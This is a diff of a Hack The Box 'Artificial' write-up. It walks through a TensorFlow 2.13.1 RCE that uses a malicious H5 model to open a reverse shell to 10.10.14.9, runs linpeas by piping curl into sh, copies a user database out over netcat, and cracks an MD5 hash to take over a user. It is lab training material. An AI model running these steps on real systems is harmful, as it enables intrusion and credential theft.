@@ -4,10 +4,24 @@ title: "Artificial"
 date: 2025-09-11 00:00:00 -0400
 author: Hugo Beaulieu
 categories: linux machine
-tags: linux machine
+tags: linux tensorflow cve rce hash-cracking sqlite docker
 ---
 
-I find a webserver with `nmap`:
+## Overview
+
+Artificial is a Linux machine hosting an AI model management platform vulnerable to a TensorFlow 2.13.1 RCE exploit. The exploitation involves creating an account, generating a malicious H5 model file containing a reverse shell payload, uploading it to the platform, and executing it to gain initial access. Privilege escalation is achieved by extracting user credentials from a SQLite database, cracking the MD5 hash, and using the recovered password to switch to the target user.
+
+## Initial Enumeration
+
+### Nmap Scan
+
+We start by scanning the target with nmap:
+
+```bash
+nmap -sV -v 10.10.11.74
+```
+
+Results:
 
 ```
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
@@ -17,7 +31,15 @@ I find a webserver with `nmap`:
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 ```
 
-I also find a few paths with `gobuster`:
+### Directory Enumeration
+
+Using gobuster, we discover several interesting paths:
+
+```bash
+gobuster dir -u http://artificial.htb -w wordlist.txt
+```
+
+Results:
 
 ```
 /dashboard            (Status: 302) [Size: 199] [--> /login]
@@ -26,19 +48,35 @@ I also find a few paths with `gobuster`:
 /register             (Status: 200) [Size: 952]
 ```
 
-I get more informations with `nikto`:
+### Service Fingerprinting
+
+Running nikto for additional information:
+
+```bash
+nikto -h http://artificial.htb
+```
 
 ```
 + HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
 ```
 
-And even more informations with `whatweb`:
+Using whatweb for technology detection:
+
+```bash
+whatweb http://artificial.htb
+```
 
 ```
 Summary   : HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], Script
 ```
 
-I decide to create a new account:
+The site appears to be running Matomo analytics along with nginx.
+
+## Web Application Analysis
+
+### User Registration
+
+We create a new account on the platform:
 
 ```
 POST /register HTTP/1.1
@@ -58,7 +96,9 @@ Connection: keep-alive
 username=random4321&email=random4321%40mail.net&password=random4321
 ```
 
-Then, I log in using the previously created account:
+### Authentication
+
+We log in using the newly created account:
 
 ```
 POST /login HTTP/1.1
@@ -78,7 +118,9 @@ Connection: keep-alive
 email=random4321%40mail.net&password=random4321
 ```
 
-I get a dashboard:
+### Dashboard Access
+
+Upon successful login, we gain access to the dashboard:
 
 ```
 GET /dashboard HTTP/1.1
@@ -94,18 +136,22 @@ Cookie: session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6InJhbmRvbTQzMjEifQ.aJZgPw.oEFDyL
 Connection: keep-alive
 ```
 
-Once logged in, I also get a `JWT token`:
+### JWT Token Analysis
 
-```
+We receive a JWT session token containing:
+
+```json
 {
   "user_id": 7,
   "username": "random4321"
 }
 ```
 
-I decide to look at the dashboard `source code`:
+### Dashboard Source Code
 
-```
+Examining the dashboard HTML reveals the application's functionality:
+
+```html
 <main>
     <section class="dashboard-section">
         <h2>Your Models</h2>
@@ -128,15 +174,19 @@ I decide to look at the dashboard `source code`:
 </main>
 ```
 
-I find 2 files, `requirements.txt` (python dependencies file):
+### Discovering the TensorFlow Environment
+
+We find two key files provided by the application:
+
+**requirements.txt** (Python dependencies):
 
 ```
 tensorflow-cpu==2.13.1
 ```
 
-And a `Dockerfile` that download the same package during the build phase:
+**Dockerfile** that downloads the same package during the build phase:
 
-```
+```dockerfile
 FROM python:3.8-slim
 
 WORKDIR /code
@@ -151,9 +201,9 @@ RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinu
 ENTRYPOINT ["/bin/bash"]
 ```
 
-This looks like it can be used with the example python code I found on home page earlier to generate a h5 model to upload:
+The homepage also provides example Python code to generate an H5 model:
 
-```
+```python
 import numpy as np
 import pandas as pd
 import tensorflow as tf
@@ -192,11 +242,32 @@ model.fit(X, y, epochs=100, verbose=1)
 model.save('profits_model.h5')
 ```
 
-After some digging on the web I find this RCE exploit for Tensorflow 2.13.1: `https://github.com/Splinter0/tensorflow-rce`
+## TensorFlow RCE Exploitation
 
-I add this to the `Dockerfile` build phase to download the RCE exploit and create a malicious h5 model file containing a payload:
+### Finding the Vulnerability
 
-```
+After researching TensorFlow 2.13.1, we discover a critical RCE exploit: `https://github.com/Splinter0/tensorflow-rce`
+
+This exploit allows us to create a malicious H5 model file that executes arbitrary code when loaded.
+
+### Building the Malicious Payload
+
+We modify the provided Dockerfile to include the exploit and generate our payload:
+
+**Modified Dockerfile:**
+
+```dockerfile
+FROM python:3.8-slim
+
+WORKDIR /code
+
+RUN apt-get update && \
+    apt-get install -y curl && \
+    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
+    rm -rf /var/lib/apt/lists/*
+
+RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
+
 # Download the Tensorflow 2.13.1 RCE exploit
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
 
@@ -205,13 +276,17 @@ RUN sed -i 's/127.0.0.1/10.10.14.9/g' exploit.py && sed -i 's/6666/4444/g' explo
 
 # Generate the malicious h5 model file containing the payload
 RUN python exploit.py
+
+ENTRYPOINT ["/bin/bash"]
 ```
 
-Then, I use the `Dockerfile` to build and create a container containing the infected h5 file.
+### Payload Generation Script
 
-#### generate-payload.sh
+We create a script to automate the Docker build process:
 
-```
+**generate-payload.sh:**
+
+```bash
 #!/bin/bash
 
 # Enable and start Docker service
@@ -230,7 +305,9 @@ CONTAINER_ID=$(sudo docker container ls -aq --filter "ancestor=generate-h5-paylo
 sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
 ```
 
-Once that's done, I upload the infected .h5:
+### Uploading the Malicious Model
+
+We upload the infected H5 file through the dashboard:
 
 ```
 POST /upload_model HTTP/1.1
@@ -256,14 +333,16 @@ Content-Type: application/x-hdf
 ------WebKitFormBoundaryTicDHAyJc5Hia94Y--
 ```
 
-Then, I start a listener with `netcat`:
+### Getting a Reverse Shell
 
-```
+We start a netcat listener:
+
+```bash
 nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 
-Finally, I run the model from the dashboard:
+Then execute the model from the dashboard:
 
 ```
 GET /run_model/ef74c658-cbcf-4601-96c6-965fd87e6788 HTTP/1.1
@@ -278,9 +357,9 @@ Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.t
 Connection: keep-alive
 ```
 
-The payload is executed and I get a connection on the `netcat` listener:
+The payload executes successfully, and we receive a connection:
 
-```
+```bash
 connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 56218
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami && pwd && ls -la
@@ -297,13 +376,17 @@ drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
 drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
 ```
 
-Once inside the box, I need to run `linpeas`.
+Success! We now have shell access as the `app` user.
 
-To do this, I first need to serve `linpeas`:
+## Privilege Escalation
 
-#### serve-linpeas.sh
+### LinPEAS Enumeration
 
-```
+We need to run LinPEAS for privilege escalation enumeration. First, we serve it from our machine:
+
+**serve-linpeas.sh:**
+
+```bash
 #!/bin/bash
 
 # Create directory to expose only linpeas script file
@@ -316,19 +399,19 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 8888
 ```
 
-Once that's done, I transfer `linpeas` on the box using `curl`, then I send the output to my machine using `netcat`:
+Then transfer and execute LinPEAS on the target, sending output to our machine:
 
-```
+```bash
 nc -lvnp 9999 > linpeas.out # My machine
 curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999 # Remote box
 ```
 
-I find some interesting informations:
+### Key Findings
+
+LinPEAS reveals several interesting details:
 
 ```
 ╔══════════╣ Active Ports
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
-══╣ Active Ports (netstat)
 tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
 tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      6086/python3
@@ -384,7 +467,7 @@ server {
 ╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
 Found /home/app/app/instance/users.db: SQLite 3.x database, last written using SQLite version 3031001
 
-╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
+╔══════════╣ Checking all env variables in /proc/*/environ
 HOME=/home/app
 LANG=en_US.UTF-8
 LOGNAME=app
@@ -398,23 +481,24 @@ SHLVL=0
 TF2_BEHAVIOR=1
 TPU_ML_PLATFORM=Tensorflow
 USER=app
-_=/usr/bin/dd
-_=/usr/bin/grep
-_=/usr/bin/xxd
 ```
 
-I find `/home/app/app/instance/users.db` interesting, if the `gael` user has configured the app, his credentials might be in there.
+The most interesting finding is `/home/app/app/instance/users.db` - if the `gael` user configured the application, their credentials might be stored there.
 
-With that in mind, I transfer the database file to my machine:
+### Extracting the Database
 
-```
+We transfer the database file to our machine using netcat:
+
+```bash
 nc -lvp 9999 > users.db # My machine
 cat /home/app/app/instance/users.db | nc 10.10.14.9 9999 # Remote box
 ```
 
-Then, I open it with `sqlite3`:
+### Examining the Database
 
-```
+We open it with sqlite3:
+
+```bash
 $ sqlite3 users.db
 SQLite version 3.40.1 2022-12-28 14:03:47
 Enter ".help" for usage hints.
@@ -431,9 +515,13 @@ sqlite> SELECT * FROM user;
 8|hacker@htb.com|hacker@htb.com|000747de68d6f043504bbb3c01c42033
 ```
 
-I identify the hash type using `namethathash`:
+Perfect! We've found hashed passwords for all users, including `gael`.
 
-```
+### Hash Identification
+
+We identify the hash type using name-that-hash:
+
+```bash
 # Install name-that-hash
 pip3 install name-that-hash
 
@@ -447,11 +535,15 @@ NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
 Domain Cached Credentials, HC: 1100 JtR: mscach
 ```
 
-I crack the hash using `hashcat` and `rockyou.txt`:
+The hash is MD5.
 
-#### crack-hash.sh
+### Hash Cracking
 
-```
+We create a script to crack the hash using hashcat:
+
+**crack-hash.sh:**
+
+```bash
 #!/bin/bash
 MODE=0
 HASH="c99175974b6e192936d97224638a34f8"
@@ -470,7 +562,7 @@ echo $HASH > hash.txt
 hashcat -m $MODE -a 0 hash.txt ./*.txt -w 4
 ```
 
-The password is `mattp005numbertwo`:
+The password is successfully cracked: `mattp005numbertwo`
 
 ```
 c99175974b6e192936d97224638a34f8:mattp005numbertwo
@@ -494,9 +586,11 @@ Candidate.Engine.: Device Generator
 Candidates.#2....: matuat -> mattj32
 ```
 
-Once I log in as `gael`, I can easily find the user flag in the home directory
+### User Flag
 
-```
+We switch to the `gael` user and retrieve the flag:
+
+```bash
 $ su gael
 Password: mattp005numbertwo
 whoami
@@ -519,3 +613,18 @@ drwx------ 2 gael gael 4096 Sep  7  2024 .ssh
 cat user.txt
 [censored-htb-flag]
 ```
+
+Success! We've obtained the user flag.
+
+## Key Takeaways
+
+- **TensorFlow 2.13.1** contains a critical RCE vulnerability in model deserialization
+- **H5 model files** can be weaponized to execute arbitrary code when loaded
+- **Docker environments** can be useful for generating exploit payloads in isolated environments
+- **SQLite databases** storing user credentials should be properly secured
+- **MD5 hashing** is cryptographically broken and should never be used for password storage
+- **Weak passwords** in rockyou.txt can be cracked quickly even with salted hashes
+- **Application configuration files** often contain sensitive database credentials
+- **JWT tokens** should be properly validated on the server side
+- **File upload functionality** requires strict validation of file types and content
+- **AI/ML platforms** handling model files need robust security controls
